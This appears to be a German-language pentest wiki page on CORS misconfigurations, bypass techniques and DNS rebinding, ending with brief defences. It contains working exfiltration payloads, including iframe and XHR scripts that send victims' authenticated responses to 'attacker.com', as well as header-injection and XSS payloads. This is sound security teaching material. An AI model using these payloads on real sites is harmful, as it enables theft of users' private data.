# CORS - Fehlkonfigurationen & Umgehung

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Was ist CORS?

Cross-Origin Resource Sharing (CORS) Standard **erm√∂glicht es Servern, zu definieren, wer auf ihre Ressourcen zugreifen kann** und **welche HTTP-Anforderungsmethoden von externen Quellen erlaubt sind**.

Eine **Same-Origin**-Richtlinie verlangt, dass ein **Server, der** eine Ressource anfordert, und der Server, der die **Ressource** hostet, dasselbe Protokoll (z. B. `http://`), den gleichen Domainnamen (z. B. `internal-web.com`) und **Port** (z. B. 80) teilen. Unter dieser Richtlinie haben nur Webseiten von derselben Domain und demselben Port Zugriff auf die Ressourcen.

Die Anwendung der Same-Origin-Richtlinie im Kontext von `http://normal-website.com/example/example.html` wird wie folgt veranschaulicht:

| Zugegriffene URL                          | Zugriff erlaubt?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Ja: Identisches Schema, Domain und Port |
| `http://normal-website.com/example2/`     | Ja: Identisches Schema, Domain und Port |
| `https://normal-website.com/example/`     | Nein: Anderes Schema und Port           |
| `http://en.normal-website.com/example/`   | Nein: Andere Domain                    |
| `http://www.normal-website.com/example/`  | Nein: Andere Domain                    |
| `http://normal-website.com:8080/example/` | Nein: Anderer Port\*                    |

\*Internet Explorer ignoriert die Portnummer bei der Durchsetzung der Same-Origin-Richtlinie und erlaubt somit diesen Zugriff.

### `Access-Control-Allow-Origin` Header

Dieser Header kann **mehrere Urspr√ºnge**, einen **`null`** Wert oder ein Wildcard **`*`** zulassen. Allerdings **unterst√ºtzt kein Browser mehrere Urspr√ºnge**, und die Verwendung des Wildcards `*` unterliegt **Einschr√§nkungen**. (Das Wildcard muss allein verwendet werden, und seine Verwendung zusammen mit `Access-Control-Allow-Credentials: true` ist nicht erlaubt.)

Dieser Header wird **von einem Server** als Antwort auf eine cross-domain Ressourcenanforderung, die von einer Webseite initiiert wurde, ausgegeben, wobei der Browser automatisch einen `Origin`-Header hinzuf√ºgt.

### `Access-Control-Allow-Credentials` Header

Standardm√§√üig werden Cross-Origin-Anfragen ohne Anmeldeinformationen wie Cookies oder den Authorization-Header durchgef√ºhrt. Ein Cross-Domain-Server kann jedoch das Lesen der Antwort erlauben, wenn Anmeldeinformationen gesendet werden, indem der `Access-Control-Allow-Credentials` Header auf **`true`** gesetzt wird.

Wenn auf `true` gesetzt, √ºbertr√§gt der Browser Anmeldeinformationen (Cookies, Autorisierungsheader oder TLS-Clientzertifikate).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-flight request

### Verst√§ndnis von Pre-flight-Anfragen in der Kommunikation √ºber Domains hinweg

Beim Initiieren einer Cross-Domain-Anfrage unter bestimmten Bedingungen, wie der Verwendung einer **nicht standardm√§√üigen HTTP-Methode** (alles au√üer HEAD, GET, POST), der Einf√ºhrung neuer **Header** oder der Verwendung eines speziellen **Content-Type-Headerwerts**, kann eine Pre-flight-Anfrage erforderlich sein. Diese vorl√§ufige Anfrage, die die **`OPTIONS`**-Methode nutzt, dient dazu, den Server √ºber die bevorstehende Cross-Origin-Anfrage und deren Absichten zu informieren, einschlie√ülich der HTTP-Methoden und Header, die verwendet werden sollen.

Das **Cross-Origin Resource Sharing (CORS)**-Protokoll verlangt diese Pre-flight-Pr√ºfung, um die Durchf√ºhrbarkeit der angeforderten Cross-Origin-Operation zu bestimmen, indem die erlaubten Methoden, Header und die Vertrauensw√ºrdigkeit des Ursprungs √ºberpr√ºft werden. F√ºr ein detailliertes Verst√§ndnis der Bedingungen, die die Notwendigkeit einer Pre-flight-Anfrage umgehen, siehe den umfassenden Leitfaden von [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Es ist wichtig zu beachten, dass die **Abwesenheit einer Pre-flight-Anfrage die Anforderung nicht aufhebt, dass die Antwort Autorisierungsheader tragen muss**. Ohne diese Header ist der Browser nicht in der Lage, die Antwort von der Cross-Origin-Anfrage zu verarbeiten.

Betrachten Sie die folgende Darstellung einer Pre-flight-Anfrage, die darauf abzielt, die `PUT`-Methode zusammen mit einem benutzerdefinierten Header namens `Special-Request-Header` zu verwenden:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
In der Antwort k√∂nnte der Server Header zur√ºckgeben, die die akzeptierten Methoden, die erlaubte Herkunft und andere CORS-Richtlinieneinstellungen anzeigen, wie unten gezeigt:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Dieser Header gibt an, welche Header w√§hrend der tats√§chlichen Anfrage verwendet werden k√∂nnen. Er wird vom Server gesetzt, um die erlaubten Header in Anfragen vom Client anzuzeigen.
* **`Access-Control-Expose-Headers`**: Durch diesen Header informiert der Server den Client dar√ºber, welche Header zus√§tzlich zu den einfachen Antwort-Headern als Teil der Antwort offengelegt werden k√∂nnen.
* **`Access-Control-Max-Age`**: Dieser Header gibt an, wie lange die Ergebnisse einer Pre-Flight-Anfrage zwischengespeichert werden k√∂nnen. Der Server legt die maximale Zeit in Sekunden fest, in der die Informationen, die von einer Pre-Flight-Anfrage zur√ºckgegeben werden, wiederverwendet werden d√ºrfen.
* **`Access-Control-Request-Headers`**: Wird in Pre-Flight-Anfragen verwendet, dieser Header wird vom Client gesetzt, um den Server dar√ºber zu informieren, welche HTTP-Header der Client in der tats√§chlichen Anfrage verwenden m√∂chte.
* **`Access-Control-Request-Method`**: Dieser Header, der ebenfalls in Pre-Flight-Anfragen verwendet wird, wird vom Client gesetzt, um anzugeben, welche HTTP-Methode in der tats√§chlichen Anfrage verwendet wird.
* **`Origin`**: Dieser Header wird automatisch vom Browser gesetzt und zeigt den Ursprung der Cross-Origin-Anfrage an. Er wird vom Server verwendet, um zu beurteilen, ob die eingehende Anfrage basierend auf der CORS-Richtlinie erlaubt oder abgelehnt werden sollte.

Beachten Sie, dass normalerweise (abh√§ngig vom Content-Type und den gesetzten Headern) in einer **GET/POST-Anfrage keine Pre-Flight-Anfrage gesendet wird** (die Anfrage wird **direkt** gesendet), aber wenn Sie auf die **Header/Body der Antwort** zugreifen m√∂chten, muss sie einen _Access-Control-Allow-Origin_ Header enthalten, der dies erlaubt.\
**Daher sch√ºtzt CORS nicht vor CSRF (aber es kann hilfreich sein).**

### **Lokale Netzwerk-Anfragen Pre-Flight-Anfrage**

1. **`Access-Control-Request-Local-Network`**: Dieser Header ist in der Anfrage des Clients enthalten, um anzuzeigen, dass die Anfrage auf eine Ressource im lokalen Netzwerk abzielt. Er dient als Marker, um den Server dar√ºber zu informieren, dass die Anfrage aus dem lokalen Netzwerk stammt.
2. **`Access-Control-Allow-Local-Network`**: Als Antwort verwenden Server diesen Header, um mitzuteilen, dass die angeforderte Ressource mit Entit√§ten au√üerhalb des lokalen Netzwerks geteilt werden darf. Er fungiert als gr√ºnes Licht f√ºr das Teilen von Ressourcen √ºber verschiedene Netzwerkgrenzen hinweg und gew√§hrleistet kontrollierten Zugriff bei gleichzeitiger Einhaltung von Sicherheitsprotokollen.

Eine **g√ºltige Antwort, die die lokale Netzwerk-Anfrage erlaubt**, muss auch in der Antwort den Header `Access-Controls-Allow-Local_network: true` enthalten:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Beachten Sie, dass die Linux **0.0.0.0** IP funktioniert, um diese Anforderungen zu **umgehen**, um auf localhost zuzugreifen, da diese IP-Adresse nicht als "lokal" betrachtet wird.

Es ist auch m√∂glich, die **Anforderungen an das lokale Netzwerk zu umgehen**, wenn Sie die **√∂ffentliche IP-Adresse eines lokalen Endpunkts** (wie die √∂ffentliche IP des Routers) verwenden. Denn in mehreren F√§llen, selbst wenn die **√∂ffentliche IP** aufgerufen wird, wird der Zugriff gew√§hrt, wenn er **vom lokalen Netzwerk** stammt.
{% endhint %}

## Ausnutzbare Fehlkonfigurationen

Es wurde beobachtet, dass die Einstellung von `Access-Control-Allow-Credentials` auf **`true`** eine Voraussetzung f√ºr die meisten **echten Angriffe** ist. Diese Einstellung erlaubt es dem Browser, Anmeldeinformationen zu senden und die Antwort zu lesen, was die Effektivit√§t des Angriffs erh√∂ht. Ohne dies verringert sich der Vorteil, einen Browser eine Anfrage stellen zu lassen, anstatt es selbst zu tun, da die Nutzung der Cookies eines Benutzers unpraktisch wird.

### Ausnahme: Ausnutzung des Netzwerkstandorts als Authentifizierung

Es gibt eine Ausnahme, bei der der Netzwerkstandort des Opfers als eine Form der Authentifizierung fungiert. Dies erm√∂glicht es, den Browser des Opfers als Proxy zu verwenden und die IP-basierte Authentifizierung zu umgehen, um auf Intranet-Anwendungen zuzugreifen. Diese Methode hat √§hnliche Auswirkungen wie DNS-Rebinding, ist jedoch einfacher auszunutzen.

### Reflexion von `Origin` in `Access-Control-Allow-Origin`

Das reale Szenario, in dem der Wert des `Origin`-Headers in `Access-Control-Allow-Origin` reflektiert wird, ist theoretisch unwahrscheinlich aufgrund von Einschr√§nkungen bei der Kombination dieser Header. Entwickler, die CORS f√ºr mehrere URLs aktivieren m√∂chten, k√∂nnen den `Access-Control-Allow-Origin`-Header dynamisch generieren, indem sie den Wert des `Origin`-Headers kopieren. Dieser Ansatz kann Schwachstellen einf√ºhren, insbesondere wenn ein Angreifer eine Domain mit einem Namen verwendet, der legitim erscheint, und damit die Validierungslogik t√§uscht.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Ausnutzen des `null` Ursprungs

Der `null` Ursprung, der f√ºr Situationen wie Weiterleitungen oder lokale HTML-Dateien angegeben wird, nimmt eine einzigartige Stellung ein. Einige Anwendungen setzen diesen Ursprung auf die Whitelist, um die lokale Entwicklung zu erleichtern, und erlauben damit unbeabsichtigt, dass jede Website einen `null` Ursprung durch ein sandboxed iframe nachahmt, wodurch CORS-Beschr√§nkungen umgangen werden.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Regular Expression Bypass Techniken

Bei der Begegnung mit einer Domain-Whitelist ist es entscheidend, nach Bypass-M√∂glichkeiten zu suchen, wie das Anh√§ngen der Domain des Angreifers an eine whitelisted Domain oder das Ausnutzen von Subdomain-√úbernahmeanf√§lligkeiten. Dar√ºber hinaus k√∂nnen regul√§re Ausdr√ºcke, die zur Validierung von Domains verwendet werden, Nuancen in den Namenskonventionen von Domains √ºbersehen, was weitere Bypass-M√∂glichkeiten bietet.

### Fortgeschrittene regul√§re Ausdruck Byp√§sse

Regex-Muster konzentrieren sich typischerweise auf alphanumerische Zeichen, Punkte (.) und Bindestriche (-) und vernachl√§ssigen andere M√∂glichkeiten. Zum Beispiel kann ein Domainname, der so gestaltet ist, dass er Zeichen enth√§lt, die von Browsern und Regex-Mustern unterschiedlich interpretiert werden, Sicherheitspr√ºfungen umgehen. Die Handhabung von Unterstrichzeichen in Subdomains durch Safari, Chrome und Firefox zeigt, wie solche Diskrepanzen ausgenutzt werden k√∂nnen, um die Logik der Domainvalidierung zu umgehen.

**F√ºr weitere Informationen und Einstellungen dieser Bypass-Pr√ºfung:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **und** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### Von XSS innerhalb einer Subdomain

Entwickler implementieren oft Abwehrmechanismen, um sich gegen CORS-Ausnutzung zu sch√ºtzen, indem sie Domains whitelisten, die berechtigt sind, Informationen anzufordern. Trotz dieser Vorsichtsma√ünahmen ist die Sicherheit des Systems nicht narrensicher. Das Vorhandensein auch nur einer einzigen anf√§lligen Subdomain innerhalb der whitelisted Domains kann die T√ºr zur CORS-Ausnutzung durch andere Schwachstellen, wie XSS (Cross-Site Scripting), √∂ffnen.

Um dies zu veranschaulichen, betrachten Sie das Szenario, in dem eine Domain, `requester.com`, whitelisted ist, um auf Ressourcen von einer anderen Domain, `provider.com`, zuzugreifen. Die serverseitige Konfiguration k√∂nnte folgenderma√üen aussehen:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
In diesem Setup haben alle Subdomains von `requester.com` Zugriff. Wenn jedoch eine Subdomain, sagen wir `sub.requester.com`, mit einer XSS-Schwachstelle kompromittiert wird, kann ein Angreifer diese Schw√§che ausnutzen. Zum Beispiel k√∂nnte ein Angreifer mit Zugriff auf `sub.requester.com` die XSS-Schwachstelle ausnutzen, um CORS-Richtlinien zu umgehen und b√∂swillig auf Ressourcen von `provider.com` zuzugreifen.

### **Server-seitige Cache-Vergiftung**

[**Aus dieser Forschung**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Es ist m√∂glich, dass durch die Ausnutzung von server-seitiger Cache-Vergiftung durch HTTP-Header-Injection eine gespeicherte Cross-Site Scripting (XSS)-Schwachstelle induziert werden kann. Dieses Szenario tritt auf, wenn eine Anwendung es vers√§umt, den `Origin`-Header auf illegale Zeichen zu bereinigen, was eine Schwachstelle insbesondere f√ºr Internet Explorer- und Edge-Nutzer schafft. Diese Browser behandeln (0x0d) als legitimen HTTP-Header-Beender, was zu HTTP-Header-Injection-Schwachstellen f√ºhrt.

Betrachten Sie die folgende Anfrage, bei der der `Origin`-Header manipuliert wird:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer und Edge interpretieren die Antwort als:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
W√§hrend es nicht machbar ist, diese Schwachstelle direkt auszunutzen, indem ein Webbrowser einen fehlerhaften Header sendet, kann eine gestaltete Anfrage manuell mit Tools wie Burp Suite generiert werden. Diese Methode k√∂nnte dazu f√ºhren, dass ein serverseitiger Cache die Antwort speichert und sie unbeabsichtigt anderen bereitstellt. Die gestaltete Payload zielt darauf ab, den Zeichensatz der Seite auf UTF-7 zu √§ndern, eine Zeichencodierung, die oft mit XSS-Schwachstellen in Verbindung gebracht wird, da sie in der Lage ist, Zeichen auf eine Weise zu codieren, die in bestimmten Kontexten als Skript ausgef√ºhrt werden kann.

F√ºr weitere Informationen zu gespeicherten XSS-Schwachstellen siehe [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Hinweis**: Die Ausnutzung von HTTP-Header-Injektionsschwachstellen, insbesondere durch serverseitige Cache-Vergiftung, unterstreicht die entscheidende Bedeutung der Validierung und Bereinigung aller benutzereingereichten Eingaben, einschlie√ülich HTTP-Header. Verwenden Sie immer ein robustes Sicherheitsmodell, das die Eingabevalidierung umfasst, um solche Schwachstellen zu verhindern.

### **Client-Seitige Cache-Vergiftung**

[**Aus dieser Forschung**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

In diesem Szenario wird eine Instanz einer Webseite beobachtet, die den Inhalt eines benutzerdefinierten HTTP-Headers ohne ordnungsgem√§√üe Kodierung widerspiegelt. Insbesondere spiegelt die Webseite die Inhalte des `X-User-id`-Headers wider, der b√∂sartigen JavaScript-Code enthalten k√∂nnte, wie im Beispiel gezeigt, in dem der Header ein SVG-Bild-Tag enth√§lt, das darauf ausgelegt ist, JavaScript-Code beim Laden auszuf√ºhren.

Cross-Origin Resource Sharing (CORS)-Richtlinien erlauben das Senden von benutzerdefinierten Headern. Ohne dass die Antwort aufgrund von CORS-Beschr√§nkungen direkt vom Browser gerendert wird, k√∂nnte der Nutzen einer solchen Injektion begrenzt erscheinen. Der kritische Punkt ergibt sich, wenn man das Cache-Verhalten des Browsers betrachtet. Wenn der `Vary: Origin`-Header nicht angegeben ist, wird es m√∂glich, dass die b√∂sartige Antwort vom Browser zwischengespeichert wird. Anschlie√üend k√∂nnte diese zwischengespeicherte Antwort direkt gerendert werden, wenn die URL aufgerufen wird, wodurch die Notwendigkeit f√ºr ein direktes Rendering bei der urspr√ºnglichen Anfrage umgangen wird. Dieser Mechanismus erh√∂ht die Zuverl√§ssigkeit des Angriffs, indem er das clientseitige Caching nutzt.

Um diesen Angriff zu veranschaulichen, wird ein JavaScript-Beispiel bereitgestellt, das dazu gedacht ist, in der Umgebung einer Webseite ausgef√ºhrt zu werden, beispielsweise √ºber ein JSFiddle. Dieses Skript f√ºhrt eine einfache Aktion aus: Es sendet eine Anfrage an eine angegebene URL mit einem benutzerdefinierten Header, der das b√∂sartige JavaScript enth√§lt. Nach erfolgreichem Abschluss der Anfrage versucht es, zur Ziel-URL zu navigieren, was die Ausf√ºhrung des injizierten Skripts ausl√∂sen k√∂nnte, wenn die Antwort ohne ordnungsgem√§√üe Handhabung des `Vary: Origin`-Headers zwischengespeichert wurde.

Hier ist eine zusammenfassende √úbersicht des verwendeten JavaScripts zur Ausf√ºhrung dieses Angriffs:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, auch bekannt als Cross-Site Script Inclusion, ist eine Art von Schwachstelle, die ausnutzt, dass die Same Origin Policy (SOP) nicht gilt, wenn Ressourcen mit dem Script-Tag eingebunden werden. Dies liegt daran, dass Skripte von verschiedenen Domains eingebunden werden m√ºssen. Diese Schwachstelle erm√∂glicht es einem Angreifer, auf jeden Inhalt zuzugreifen und diesen zu lesen, der mit dem Script-Tag eingebunden wurde.

Diese Schwachstelle wird besonders signifikant, wenn es um dynamisches JavaScript oder JSONP (JSON mit Padding) geht, insbesondere wenn Informationen zur Umgebungsautorisierung wie Cookies zur Authentifizierung verwendet werden. Bei der Anforderung einer Ressource von einem anderen Host werden die Cookies mitgesendet, wodurch sie f√ºr den Angreifer zug√§nglich sind.

Um diese Schwachstelle besser zu verstehen und zu mindern, k√∂nnen Sie das BurpSuite-Plugin verwenden, das unter [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) verf√ºgbar ist. Dieses Plugin kann helfen, potenzielle XSSI-Schwachstellen in Ihren Webanwendungen zu identifizieren und zu beheben.

[**Erfahren Sie hier mehr √ºber die verschiedenen Arten von XSSI und wie man sie ausnutzt.**](xssi-cross-site-script-inclusion.md)

Versuchen Sie, einen **`callback`** **Parameter** in die Anfrage einzuf√ºgen. Vielleicht war die Seite darauf vorbereitet, die Daten als JSONP zu senden. In diesem Fall sendet die Seite die Daten mit `Content-Type: application/javascript` zur√ºck, was die CORS-Policy umgeht.

![](<../.gitbook/assets/image (856).png>)

### Einfacher (nutzloser?) Bypass

Eine M√∂glichkeit, die Einschr√§nkung `Access-Control-Allow-Origin` zu umgehen, besteht darin, eine Webanwendung zu bitten, eine Anfrage in Ihrem Namen zu stellen und die Antwort zur√ºckzusenden. In diesem Szenario werden jedoch die Anmeldeinformationen des endg√ºltigen Opfers nicht gesendet, da die Anfrage an eine andere Domain gerichtet ist.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Dieses Tool bietet einen Proxy, der Ihre Anfrage zusammen mit ihren Headern weiterleitet und gleichzeitig den Origin-Header f√§lscht, um mit der angeforderten Domain √ºbereinzustimmen. Dies umgeht effektiv die CORS-Policy. Hier ist ein Beispiel f√ºr die Verwendung mit XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Dieses Tool bietet einen alternativen Ansatz zum Proxying von Anfragen. Anstatt Ihre Anfrage unver√§ndert weiterzuleiten, stellt der Server seine eigene Anfrage mit den angegebenen Parametern.

### Iframe + Popup Bypass

Sie k√∂nnen **CORS-Pr√ºfungen** wie `e.origin === window.origin` umgehen, indem Sie **ein Iframe erstellen** und **von dort ein neues Fenster √∂ffnen**. Weitere Informationen auf der folgenden Seite:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding √ºber TTL

DNS-Rebinding √ºber TTL ist eine Technik, die verwendet wird, um bestimmte Sicherheitsma√ünahmen zu umgehen, indem DNS-Eintr√§ge manipuliert werden. So funktioniert es:

1. Der Angreifer erstellt eine Webseite und bringt das Opfer dazu, darauf zuzugreifen.
2. Der Angreifer √§ndert dann die DNS (IP) seiner eigenen Domain, um auf die Webseite des Opfers zu verweisen.
3. Der Browser des Opfers speichert die DNS-Antwort, die m√∂glicherweise einen TTL (Time to Live)-Wert hat, der angibt, wie lange der DNS-Eintrag als g√ºltig betrachtet werden soll.
4. Wenn der TTL abl√§uft, stellt der Browser des Opfers eine neue DNS-Anfrage, wodurch der Angreifer JavaScript-Code auf der Seite des Opfers ausf√ºhren kann.
5. Indem der Angreifer die Kontrolle √ºber die IP des Opfers beh√§lt, kann er Informationen vom Opfer sammeln, ohne Cookies an den Server des Opfers zu senden.

Es ist wichtig zu beachten, dass Browser √ºber Caching-Mechanismen verf√ºgen, die einen sofortigen Missbrauch dieser Technik verhindern k√∂nnen, selbst bei niedrigen TTL-Werten.

DNS-Rebinding kann n√ºtzlich sein, um explizite IP-Pr√ºfungen zu umgehen, die vom Opfer durchgef√ºhrt werden, oder f√ºr Szenarien, in denen ein Benutzer oder Bot l√§ngere Zeit auf derselben Seite bleibt, wodurch der Cache abl√§uft.

Wenn Sie eine schnelle M√∂glichkeit ben√∂tigen, DNS-Rebinding auszunutzen, k√∂nnen Sie Dienste wie [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) verwenden.

Um Ihren eigenen DNS-Rebinding-Server zu betreiben, k√∂nnen Sie Tools wie **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) verwenden. Dies beinhaltet das Exponieren Ihres lokalen Ports 53/udp, das Erstellen eines A-Eintrags, der darauf verweist (z. B. ns.example.com), und das Erstellen eines NS-Eintrags, der auf den zuvor erstellten A-Subdomain verweist (z. B. ns.example.com). Jeder Subdomain von ns.example.com wird dann von Ihrem Host aufgel√∂st.

Sie k√∂nnen auch einen √∂ffentlich laufenden Server unter [http://rebind.it/singularity.html](http://rebind.it/singularity.html) erkunden, um ein besseres Verst√§ndnis und Experimentieren zu erm√∂glichen.

### DNS Rebinding √ºber **DNS Cache Flooding**

DNS-Rebinding √ºber DNS-Cache-Flutung ist eine weitere Technik, die verwendet wird, um den Caching-Mechanismus von Browsern zu umgehen und eine zweite DNS-Anfrage zu erzwingen. So funktioniert es:

1. Zun√§chst, wenn das Opfer eine DNS-Anfrage stellt, wird mit der IP-Adresse des Angreifers geantwortet.
2. Um die Caching-Abwehr zu umgehen, nutzt der Angreifer einen Service Worker. Der Service Worker flutet den DNS-Cache, wodurch der zwischengespeicherte Servername des Angreifers effektiv gel√∂scht wird.
3. Wenn der Browser des Opfers eine zweite DNS-Anfrage stellt, wird nun mit der IP-Adresse 127.0.0.1 geantwortet, die typischerweise auf localhost verweist.

Durch das Fluten des DNS-Caches mit dem Service Worker kann der Angreifer den DNS-Aufl√∂sungsprozess manipulieren und den Browser des Opfers zwingen, eine zweite Anfrage zu stellen, die diesmal auf die gew√ºnschte IP-Adresse des Angreifers aufgel√∂st wird.

### DNS Rebinding √ºber **Cache**

Eine weitere M√∂glichkeit, die Caching-Abwehr zu umgehen, besteht darin, mehrere IP-Adressen f√ºr dieselbe Subdomain im DNS-Anbieter zu nutzen. So funktioniert es:

1. Der Angreifer richtet zwei A-Eintr√§ge (oder einen einzelnen A-Eintrag mit zwei IPs) f√ºr dieselbe Subdomain im DNS-Anbieter ein.
2. Wenn ein Browser diese Eintr√§ge √ºberpr√ºft, erh√§lt er beide IP-Adressen.
3. Wenn der Browser sich entscheidet, zuerst die IP-Adresse des Angreifers zu verwenden, kann der Angreifer ein Payload bereitstellen, das HTTP-Anfragen an dieselbe Domain durchf√ºhrt.
4. Sobald der Angreifer jedoch die IP-Adresse des Opfers erhalten hat, h√∂rt er auf, auf den Browser des Opfers zu antworten.
5. Der Browser des Opfers, der erkennt, dass die Domain nicht reagiert, wechselt zur Verwendung der zweiten angegebenen IP-Adresse.
6. Durch den Zugriff auf die zweite IP-Adresse umgeht der Browser die Same Origin Policy (SOP), wodurch der Angreifer dies ausnutzen und Informationen sammeln und exfiltrieren kann.

Diese Technik nutzt das Verhalten von Browsern aus, wenn mehrere IP-Adressen f√ºr eine Domain bereitgestellt werden. Durch strategische Kontrolle der Antworten und Manipulation der IP-Adresse, die der Browser ausw√§hlt, kann ein Angreifer die SOP ausnutzen und auf Informationen vom Opfer zugreifen.

{% hint style="warning" %}
Beachten Sie, dass Sie, um auf localhost zuzugreifen, versuchen sollten, **127.0.0.1** in Windows und **0.0.0.0** in Linux neu zu binden.\
Anbieter wie GoDaddy oder Cloudflare erlaubten mir nicht, die IP 0.0.0.0 zu verwenden, aber AWS Route53 erlaubte mir, einen A-Eintrag mit 2 IPs zu erstellen, wobei eine davon "0.0.0.0" war.

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

F√ºr weitere Informationen k√∂nnen Sie [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/) √ºberpr√ºfen.

### Andere h√§ufige Byp√§sse

* Wenn **interne IPs nicht erlaubt sind**, k√∂nnten sie **vergessen haben, 0.0.0.0 zu verbieten** (funktioniert unter Linux und Mac)
* Wenn **interne IPs nicht erlaubt sind**, antworten Sie mit einem **CNAME** zu **localhost** (funktioniert unter Linux und Mac)
* Wenn **interne IPs nicht erlaubt sind** als DNS-Antworten, k√∂nnen Sie mit **CNAMEs zu internen Diensten** wie www.corporate.internal antworten.

### DNS Rebidding Waffeisiert

Sie k√∂nnen weitere Informationen √ºber die vorherigen Bypass-Techniken und die Verwendung des folgenden Tools im Vortrag [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ) finden.

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) ist ein Tool, um [DNS-Rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding) Angriffe durchzuf√ºhren. Es enth√§lt die notwendigen Komponenten, um die IP-Adresse des Angreifer-Server-DNS-Namens an die IP-Adresse der Zielmaschine neu zu binden und Angriffs-Payloads bereitzustellen, um anf√§llige Software auf der Zielmaschine auszunutzen.

### Echte Schutzma√ünahmen gegen DNS-Rebinding

* Verwenden Sie TLS in internen Diensten
* Fordern Sie eine Authentifizierung an, um auf Daten zuzugreifen
* Validieren Sie den Host-Header
